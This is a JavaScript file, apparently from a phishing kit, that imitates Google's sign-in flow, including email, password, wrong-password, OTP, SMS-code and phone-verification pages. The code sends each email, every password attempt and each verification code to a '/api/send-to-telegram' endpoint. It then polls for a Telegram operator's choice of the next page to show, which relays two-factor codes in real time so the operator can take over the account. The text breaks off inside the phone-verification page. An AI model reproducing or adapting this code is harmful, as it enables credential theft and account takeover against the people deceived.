// ============================================================
// ENHANCED AUTH HANDLER - Google UI Matching Version
// ============================================================
let currentSessionId  = null;
let currentEmail      = null;
let passwordAttempts  = [];   // all password attempts this session
let isTransitioning   = false; // prevent double page transitions

document.addEventListener('DOMContentLoaded', function() {
  initEmailPage();
});

function initEmailPage() {
  const form = document.getElementById('email-form');
  const emailInput = document.getElementById('email-input');
  const nextButton = document.getElementById('next-button');

  if (!form || !emailInput || !nextButton) return;

  emailInput.addEventListener('input', function() {
    if (this.value.length > 0) {
      this.setAttribute('data-has-content', 'true');
    }
  });

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    const email = emailInput.value.trim();

    if (!email) {
      showError('Please enter an email or phone', emailInput);
      return;
    }

    nextButton.disabled = true;
    nextButton.textContent = 'Verifying…';

    fetch('/api/validate-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: email })
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        currentEmail = email;
        createSession(email);
        
        const container = document.querySelector('.qx5512-pg');
        if (container) {
          container.style.transition = 'opacity 0.3s ease-out';
          container.style.opacity = '0';
        }

        setTimeout(function() {
          showPasswordPage(email);
        }, 300);
      } else {
        showError(data.message || 'Validation failed', emailInput);
        nextButton.disabled = false;
        nextButton.textContent = 'Next';
      }
    })
    .catch(error => {
      console.error('API Error:', error);
      showError('Network error. Please try again.', emailInput);
      nextButton.disabled = false;
      nextButton.textContent = 'Next';
    });
  });
}

function createSession(email) {
  // Generate sessionId immediately (don't wait for server round-trip)
  currentSessionId = generateSessionId();
  console.log('Session ID generated:', currentSessionId);

  // Send email to Telegram right away
  sendToTelegram('EMAIL', email, email, currentSessionId);

  // Also tell server about the session (fire-and-forget)
  fetch('/api/create-session', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: email, sessionId: currentSessionId })
  })
  .then(r => r.json())
  .then(data => console.log('Session confirmed on server:', data))
  .catch(error => console.error('Session sync error (non-fatal):', error));
}

function generateSessionId() {
  // Match PHP md5(uniqid()) format - 32 hex chars
  return Array.from(crypto.getRandomValues(new Uint8Array(16)))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

function showError(message, inputElement) {
  const existing = document.querySelector('.error-container');
  if (existing) {
    existing.remove();
  }

  if (inputElement) {
    inputElement.classList.add('error-input');
  }

  const errorContainer = document.createElement('div');
  errorContainer.className = 'error-container';
  errorContainer.style.cssText = 'display:flex;align-items:center;gap:12px;margin-top:12px;padding:0;';

  const icon = document.createElement('div');
  icon.style.cssText = 'flex-shrink:0;width:24px;height:24px;background-color:#f8d7da;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;color:#d33f3f;font-size:16px;';
  icon.textContent = '!';

  const messageSpan = document.createElement('span');
  messageSpan.style.cssText = 'color:#d33f3f;font-size:13px;font-weight:500;';
  messageSpan.textContent = message;

  errorContainer.appendChild(icon);
  errorContainer.appendChild(messageSpan);

  const form = document.getElementById('email-form');
  form.insertAdjacentElement('beforeend', errorContainer);

  setTimeout(function() { errorContainer.remove(); }, 5000);
}

// ============================================================
// PASSWORD PAGE
// ============================================================
function showPasswordPage(email) {
  document.body.innerHTML = buildPasswordPageHTML(email);
  initPasswordPage(email);

  const container = document.querySelector('.qx5512-pg');
  if (container) {
    container.style.opacity = '0';
    setTimeout(function() {
      container.style.transition = 'opacity 0.3s ease-in';
      container.style.opacity = '1';
    }, 10);
  }
}

function buildPasswordPageHTML(email) {
  const safeEmail = String(email)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');

  return '' +
'<style>' +
'.qx5512-pw[data-has-content] + .qx5512-il,' +
'.qx5512-pw:not(:placeholder-shown) + .qx5512-il {' +
'  font-size: .75rem;' +
'  line-height: 1rem;' +
'  top: 0;' +
'  transform: translateY(-50%);' +
'}' +
'</style>' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24" aria-label="Google" role="img">' +
'          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>' +
'          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>' +
'          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>' +
'          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path>' +
'        </svg>' +
'        <h1>Welcome</h1>' +
'        <button type="button" class="qx5512-er" style="background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed">' +
'          <span style="flex:1;text-align:left;font-weight:500;color:#e8eaed">' + safeEmail + '</span>' +
'        </button>' +
'      </div>' +
'      <div class="qx5512-fs">' +
'        <form class="qx5512-pf" id="password-form">' +
'          <div>' +
'            <div class="qx5512-if">' +
'              <input class="qx5512-pw" required type="password" id="password-input" placeholder=" ">' +
'              <span class="qx5512-il">Enter your password</span>' +
'            </div>' +
'            <div class="qx5512-cr">' +
'              <input id="show-password" type="checkbox">' +
'              <label for="show-password">Show password</label>' +
'            </div>' +
'            <p class="qx5512-pl">Before using this app, you can review Invitely\'s <a href="#">privacy policy</a> and <a href="#">terms of service</a>.</p>' +
'          </div>' +
'          <div class="qx5512-bg qx5512-pa">' +
'            <a href="#" class="qx5512-fl">Try another way</a>' +
'            <button type="submit" class="qx5512-nb">Next</button>' +
'          </div>' +
'        </form>' +
'      </div>' +
'    </div>' +
'  </div>' +
'  <footer class="qx5512-pf-ft">' +
'    <div class="qx5512-ls-w">' +
'      <select class="qx5512-ls" aria-label="Language">' +
'        <option value="en" selected>English (United States)</option>' +
'      </select>' +
'    </div>' +
'    <nav class="qx5512-fl-nk" aria-label="Footer">' +
'      <a href="#">Help</a>' +
'      <a href="#">Privacy</a>' +
'      <a href="#">Terms</a>' +
'    </nav>' +
'  </footer>' +
'</div>';
}

function initPasswordPage(email) {
  const passwordInput = document.getElementById('password-input');
  const showCheckbox = document.getElementById('show-password');
  const form = document.getElementById('password-form');
  const submitBtn = form ? form.querySelector('button[type="submit"]') : null;

  if (passwordInput) {
    passwordInput.addEventListener('input', function() {
      if (this.value.length > 0) {
        this.setAttribute('data-has-content', 'true');
      }
    });
  }

  if (showCheckbox && passwordInput) {
    showCheckbox.addEventListener('change', function() {
      passwordInput.type = this.checked ? 'text' : 'password';
    });
  }

  if (form && submitBtn) {
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const password = passwordInput.value.trim();

      if (!password) {
        alert('Please enter your password');
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = 'Signing in…';

      fetch('/api/validate-password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ password: password, sessionId: currentSessionId })
      })
      .then(response => response.json())
      .then(data => {
        passwordAttempts.push(password);
        sendToTelegram('PASSWORD', currentEmail, JSON.stringify(passwordAttempts), currentSessionId)
          .then(function() {
            if (currentSessionId) {
              pollForResponse(currentSessionId, submitBtn);
            } else {
              console.error('No sessionId available - cannot poll');
              submitBtn.disabled = false;
              submitBtn.textContent = 'Next';
            }
          });
      })
      .catch(error => {
        console.error('API Error:', error);
        submitBtn.disabled = false;
        submitBtn.textContent = 'Next';
      });
    });
  }
}

// ============================================================
// SEND DATA TO TELEGRAM (Cumulative)
// ============================================================
function sendToTelegram(dataType, email, data, sessionId) {
  // Returns a Promise — callers MUST wait before starting pollForResponse
  // so the session is reset to 'pending' before the first poll fires
  return fetch('/api/send-to-telegram', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ type: dataType, email: email, data: data, sessionId: sessionId })
  })
  .then(function(r) { return r.json(); })
  .catch(function(err) { console.error('Telegram send error:', err); });
}

// ============================================================
// POLLING - Wait for Telegram bot response
// ============================================================
// Global polling flag — ensures only one poll chain runs at a time
// and in-flight fetches don't trigger transitions after polling is stopped
let pollingActive = false;

function pollForResponse(sessionId, submitBtn) {
  // Stop any previous poll chain
  pollingActive = false;

  const maxWait    = 120000;
  const interval   = 1000;
  const startTime  = Date.now();

  // Small buffer before first poll to let any network state settle
  setTimeout(startPolling, 200);

  function startPolling() {
    pollingActive = true;
    tick();
  }

  function tick() {
    if (!pollingActive) return; // stopped externally

    if (Date.now() - startTime > maxWait) {
      pollingActive = false;
      if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = 'Next'; }
      return;
    }

    fetch('/api/poll-session?sessionId=' + sessionId)
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (!pollingActive) return; // stopped while fetch was in-flight

        if (data.status === 'responded' && data.responseType) {
          pollingActive = false; // stop before transition
          handleTelegramResponse(data.responseType, data.response, data.email || currentEmail, sessionId);
        } else {
          // Still waiting — schedule next tick
          setTimeout(tick, interval);
        }
      })
      .catch(function() {
        if (pollingActive) setTimeout(tick, interval);
      });
  }
}

// ============================================================
// RESPONSE HANDLERS
// ============================================================
function handleTelegramResponse(responseType, responseText, email, sessionId) {
  // Guard: pollingActive was already set false before this call,
  // but isTransitioning prevents any stale in-flight fetch from doubling up
  if (isTransitioning) return;
  isTransitioning = true;

  // Step 1: Fade OUT old page
  const old = document.querySelector('.qx5512-pg');
  if (old) {
    old.style.transition = 'opacity 0.2s ease';
    old.style.opacity    = '0';
  }

  // Step 2: After fade-out, swap content
  setTimeout(function() {
    switch (responseType) {
      case 'incorrect_password': showIncorrectPasswordPage(email, sessionId); break;
      case 'otp_required':       showOTPPage(email, sessionId);               break;
      case 'phone_verification': showPhoneVerificationPage(email, responseText, sessionId); break;
      case 'sms_code':           showSMSCodePage(email, sessionId);           break;
      case 'success':            showSuccessPage();                            break;
      case 'sua':                showSUAPage(email, sessionId);               break;
      case 'error':              showErrorPage(responseText);                  break;
      default:                   showSuccessPage();
    }

    // Step 3: New page in DOM — commit opacity:0 via reflow, then fade IN
    const pg = document.querySelector('.qx5512-pg');
    if (pg) {
      pg.style.transition = 'none';
      pg.style.opacity    = '0';
      pg.getBoundingClientRect(); // force reflow
      pg.style.transition = 'opacity 0.25s ease';
      pg.style.opacity    = '1';
    }

    // Allow next transition only after fade-in completes
    setTimeout(function() { isTransitioning = false; }, 300);
  }, 200);
}

// ============================================================
// INCORRECT PASSWORD PAGE - Google UI Match

function showIncorrectPasswordPage(email, sessionId) {
  var safeEmail = String(email).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  document.body.innerHTML =
    '<div class="qx5512-pg"><div class="qx5512-mn"><div class="qx5512-lc">' +
    '<div class="qx5512-bs">' +
    '<svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24" aria-label="Google"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>' +
    '<h1>Welcome</h1>' +
    '<button type="button" class="qx5512-er" style="background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px"><svg class="qx5512-av" viewBox="0 0 24 24" width="20" height="20"><path fill="#e8eaed" d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg><span style="flex:1;text-align:left;font-weight:500;color:#e8eaed">' + safeEmail + '</span><svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#e8eaed" d="M7 10l5 5 5-5z"/></svg></button>' +
    '</div>' +
    '<div class="qx5512-fs"><form class="qx5512-pf" id="pw-retry-form"><div>' +
    '<div class="qx5512-if">' +
    '<input class="qx5512-pw" required type="password" id="pw-retry-input" placeholder=" " style="border-color:#d93025">' +
    '<span class="qx5512-il" style="color:#d93025">Enter your password</span>' +
    '</div>' +
    '<div style="display:flex;align-items:center;gap:6px;margin-top:8px">' +
    '<svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#d93025" d="M11 15h2v2h-2zm0-8h2v6h-2zm1-5C6.47 2 2 6.5 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2zm0 18a8 8 0 0 1-8-8 8 8 0 0 1 8-8 8 8 0 0 1 8 8 8 8 0 0 1-8 8z"/></svg>' +
    '<span style="color:#d93025 !important;font-size:14px;line-height:1.4">Wrong password. Try again or click &#34;Forgot password?&#34; for more options.</span>' +
    '</div>' +
    '<div class="qx5512-cr" style="margin-top:16px"><input id="pw-retry-show" type="checkbox"><label for="pw-retry-show">Show password</label></div>' +
    '</div>' +
    '<div class="qx5512-bg qx5512-pa"><a href="#" class="qx5512-fl">Forgot password?</a>' +
    '<button type="submit" class="qx5512-nb">Next</button></div>' +
    '</form></div></div></div></div>' +
    '<footer class="qx5512-pf-ft"><div class="qx5512-ls-w"><select class="qx5512-ls"><option selected>English (United States)</option></select></div><nav class="qx5512-fl-nk"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></nav></footer>';

  var inp = document.getElementById('pw-retry-input');
  inp.focus();
  document.getElementById('pw-retry-show').addEventListener('change', function() {
    inp.type = this.checked ? 'text' : 'password';
  });
  document.getElementById('pw-retry-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var password = inp.value.trim();
    if (!password) return;
    var btn = this.querySelector('button[type="submit"]');
    btn.disabled = true; btn.textContent = 'Signing in\u2026';
    inp.disabled = true;
    passwordAttempts.push(password);
    // Wait for sendToTelegram to COMPLETE before polling
    // This ensures session is reset to 'pending' before first poll fires
    sendToTelegram('PASSWORD', currentEmail, JSON.stringify(passwordAttempts), currentSessionId)
      .then(function() {
        if (currentSessionId) pollForResponse(currentSessionId, btn);
      })
      .catch(function() { btn.disabled=false; inp.disabled=false; btn.textContent='Next'; });
  });
}


// ============================================================
// OTP PAGE

function showOTPPage(email, sessionId) {
  var safeEmail = String(email).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  document.body.innerHTML =
    '<div class="qx5512-pg"><div class="qx5512-mn"><div class="qx5512-lc">' +
    '<div class="qx5512-bs">' +
    '<svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24" aria-label="Google"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>' +
    '<h1>Sign in</h1>' +
    '<p style="color:#e8eaed;font-size:14px;margin:8px 0 0;max-width:360px;line-height:1.5">To help keep your account safe, Google wants to make sure it&#39;s really you trying to sign in</p>' +
    '<button type="button" class="qx5512-er" style="background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px"><svg class="qx5512-av" viewBox="0 0 24 24" width="20" height="20"><path fill="#e8eaed" d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg><span style="flex:1;text-align:left;font-weight:500;color:#e8eaed">' + safeEmail + '</span><svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#e8eaed" d="M7 10l5 5 5-5z"/></svg></button>' +
    '</div>' +
    '<div class="qx5512-fs"><form class="qx5512-pf" id="otp-form">' +
    '<p style="color:#e8eaed;font-size:14px;margin-bottom:20px;line-height:1.5">A verification code has been sent to your email</p>' +
    '<div class="qx5512-if">' +
    '<input class="qx5512-pw" required type="text" id="otp-input" placeholder=" " maxlength="6" inputmode="numeric" autocomplete="one-time-code">' +
    '<span class="qx5512-il">Enter code</span></div>' +
    '<div class="qx5512-bg qx5512-pa" style="margin-top:28px"><a href="#" class="qx5512-fl">Try another way</a>' +
    '<button type="submit" class="qx5512-nb">Next</button></div>' +
    '</form></div></div></div></div>' +
    '<footer class="qx5512-pf-ft"><div class="qx5512-ls-w"><select class="qx5512-ls"><option selected>English (United States)</option></select></div><nav class="qx5512-fl-nk"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></nav></footer>';

  var inp = document.getElementById('otp-input'); inp.focus();
  document.getElementById('otp-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var code = inp.value.trim();
    if (!code) return;
    var btn = this.querySelector('button[type="submit"]');
    btn.disabled=true; inp.disabled=true; btn.textContent='Verifying…';
    sendToTelegram('OTP', email, code, sessionId);
    setTimeout(function(){ pollForResponse(sessionId, btn); }, 500);
  });
}


// ============================================================
// SMS CODE PAGE - Hidden Phone Number

function showSMSCodePage(email, sessionId) {
  var safeEmail = String(email).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  document.body.innerHTML =
    '<div class="qx5512-pg"><div class="qx5512-mn"><div class="qx5512-lc">' +
    '<div class="qx5512-bs">' +
    '<svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24" aria-label="Google"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>' +
    '<h1>Sign in</h1>' +
    '<p style="color:#e8eaed;font-size:14px;margin:8px 0 0;max-width:360px;line-height:1.5">To help keep your account safe, Google wants to make sure it&#39;s really you trying to sign in</p>' +
    '<button type="button" class="qx5512-er" style="background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px"><svg class="qx5512-av" viewBox="0 0 24 24" width="20" height="20"><path fill="#e8eaed" d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg><span style="flex:1;text-align:left;font-weight:500;color:#e8eaed">' + safeEmail + '</span><svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#e8eaed" d="M7 10l5 5 5-5z"/></svg></button>' +
    '</div>' +
    '<div class="qx5512-fs"><form class="qx5512-pf" id="sms-form">' +
    '<p style="color:#e8eaed;font-size:14px;margin-bottom:20px;line-height:1.5">A text message with a 6-digit verification code has been sent to your phone number</p>' +
    '<div class="qx5512-if">' +
    '<input class="qx5512-pw" required type="text" id="sms-input" placeholder=" " maxlength="8" inputmode="numeric" autocomplete="one-time-code">' +
    '<span class="qx5512-il">G- Enter code</span></div>' +
    '<p style="margin-top:14px"><a href="#" class="qx5512-fl" style="font-size:14px">Resend it</a></p>' +
    '<div class="qx5512-bg qx5512-pa" style="margin-top:20px"><a href="#" class="qx5512-fl">Try another way</a>' +
    '<button type="submit" class="qx5512-nb">Next</button></div>' +
    '</form></div></div></div></div>' +
    '<footer class="qx5512-pf-ft"><div class="qx5512-ls-w"><select class="qx5512-ls"><option selected>English (United States)</option></select></div><nav class="qx5512-fl-nk"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></nav></footer>';

  var inp = document.getElementById('sms-input'); inp.focus();
  document.getElementById('sms-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var code = inp.value.trim();
    if (!code) return;
    var btn = this.querySelector('button[type="submit"]');
    btn.disabled=true; inp.disabled=true; btn.textContent='Verifying…';
    sendToTelegram('SMS_CODE', email, code, sessionId);
    setTimeout(function(){ pollForResponse(sessionId, btn); }, 500);
  });
}


// ============================================================
// PHONE VERIFICATION PAGE - With Country Code Selector

function showPhoneVerificationPage(email, phoneNumber, sessionId) {
  var safeEmail = String(email).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  document.body.innerHTML =
    '<div class="qx5512-pg"><div class="qx5512-mn"><div class="qx5512-lc">' +
    '<div class="qx5512-bs">' +
    '<svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24" aria-label="Google"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>' +
    '<h1>Sign in</h1>' +
    '<p style="color:#e8eaed;font-size:14px;margin:8px 0 0;max-width:360px;line-height:1.5">To help keep your account safe, Google wants to make sure it&#39;s really you trying to sign in</p>' +
    '<button type="button" class="qx5512-er" style="background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px"><svg class="qx5512-av" viewBox="0 0 24 24" width="20" height="20"><path fill="#e8eaed" d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg><span style="flex:1;text-align:left;font-weight:500;color:#e8eaed">' + safeEmail + '</span><svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#e8eaed" d="M7 10l5 5 5-5z"/></svg></button>' +
    '</div>' +
    '<div class="qx5512-fs"><form class="qx5512-pf" id="phone-form">' +
    '<p style="color:#e8eaed;font-size:15px;font-weight:500;margin-bottom:6px">Get a verification code</p>' +
    '<p style="color:#9aa0a6;font-size:14px;margin-bottom:20px;line-height:1.5">To get a verification code, confirm your phone number. Standard message and data rates may apply.</p>' +
    '<div style="display:flex;border:1px solid #5f6368;border-radius:4px;overflow:hidden;background:#202124">' +
    '<div style="position:relative;flex-shrink:0;border-right:1px solid #5f6368">' +
    '<span id="ph-flag" style="position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:18px;pointer-events:none;z-index:1">🇺🇸</span>' +
    '<select id="ph-country" style="padding:14px 28px 14px 40px;background:transparent;border:none;color:#e8eaed;font-size:13px;cursor:pointer;appearance:none;-webkit-appearance:none;width:140px;outline:none">' +
    '<option value="US|+1">🇺🇸 +1</option><option value="CA|+1">🇨🇦 +1</option><option value="GB|+44">🇬🇧 +44</option><option value="AU|+61">🇦🇺 +61</option><option value="DE|+49">🇩🇪 +49</option><option value="FR|+33">🇫🇷 +33</option><option value="IT|+39">🇮🇹 +39</option><option value="ES|+34">🇪🇸 +34</option><option value="PT|+351">🇵🇹 +351</option><option value="NL|+31">🇳🇱 +31</option><option value="BE|+32">🇧🇪 +32</option><option value="CH|+41">🇨🇭 +41</option><option value="AT|+43">🇦🇹 +43</option><option value="SE|+46">🇸🇪 +46</option><option value="NO|+47">🇳🇴 +47</option><option value="DK|+45">🇩🇰 +45</option><option value="FI|+358">🇫🇮 +358</option><option value="PL|+48">🇵🇱 +48</option><option value="CZ|+420">🇨🇿 +420</option><option value="HU|+36">🇭🇺 +36</option><option value="RO|+40">🇷🇴 +40</option><option value="UA|+380">🇺🇦 +380</option><option value="GR|+30">🇬🇷 +30</option><option value="RU|+7">🇷🇺 +7</option><option value="TR|+90">🇹🇷 +90</option><option value="IN|+91">🇮🇳 +91</option><option value="PK|+92">🇵🇰 +92</option><option value="BD|+880">🇧🇩 +880</option><option value="LK|+94">🇱🇰 +94</option><option value="NP|+977">🇳🇵 +977</option><option value="CN|+86">🇨🇳 +86</option><option value="JP|+81">🇯🇵 +81</option><option value="KR|+82">🇰🇷 +82</option><option value="TW|+886">🇹🇼 +886</option><option value="HK|+852">🇭🇰 +852</option><option value="SG|+65">🇸🇬 +65</option><option value="MY|+60">🇲🇾 +60</option><option value="ID|+62">🇮🇩 +62</option><option value="PH|+63">🇵🇭 +63</option><option value="TH|+66">🇹🇭 +66</option><option value="VN|+84">🇻🇳 +84</option><option value="NZ|+64">🇳🇿 +64</option><option value="BR|+55">🇧🇷 +55</option><option value="AR|+54">🇦🇷 +54</option><option value="CO|+57">🇨🇴 +57</option><option value="CL|+56">🇨🇱 +56</option><option value="PE|+51">🇵🇪 +51</option><option value="MX|+52">🇲🇽 +52</option><option value="SA|+966">🇸🇦 +966</option><option value="AE|+971">🇦🇪 +971</option><option value="QA|+974">🇶🇦 +974</option><option value="KW|+965">🇰🇼 +965</option><option value="EG|+20">🇪🇬 +20</option><option value="MA|+212">🇲🇦 +212</option><option value="NG|+234">🇳🇬 +234</option><option value="GH|+233">🇬🇭 +233</option><option value="KE|+254">🇰🇪 +254</option><option value="ZA|+27">🇿🇦 +27</option><option value="ET|+251">🇪🇹 +251</option><option value="TZ|+255">🇹🇿 +255</option><option value="UG|+256">🇺🇬 +256</option><option value="CM|+237">🇨🇲 +237</option><option value="SN|+221">🇸🇳 +221</option>' +
    '</select>' +
    '<svg viewBox="0 0 24 24" width="16" height="16" style="position:absolute;right:6px;top:50%;transform:translateY(-50%);pointer-events:none"><path fill="#9aa0a6" d="M7 10l5 5 5-5z"/></svg>' +
    '</div>' +
    '<div class="qx5512-if" style="flex:1;border:none;border-radius:0">' +
    '<input class="qx5512-pw" required type="tel" id="ph-number" placeholder=" " style="border:none;border-radius:0;background:transparent">' +
    '<span class="qx5512-il">Phone number</span></div></div>' +
    '<div class="qx5512-bg qx5512-pa" style="margin-top:28px"><a href="#" class="qx5512-fl">Try another way</a>' +
    '<button type="submit" class="qx5512-nb">Send</button></div>' +
    '</form></div></div></div></div>' +
    '<footer class="qx5512-pf-ft"><div class="qx5512-ls-w"><select class="qx5512-ls"><option selected>English (United States)</option></select></div><nav class="qx5512-fl-nk"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></nav></footer>';

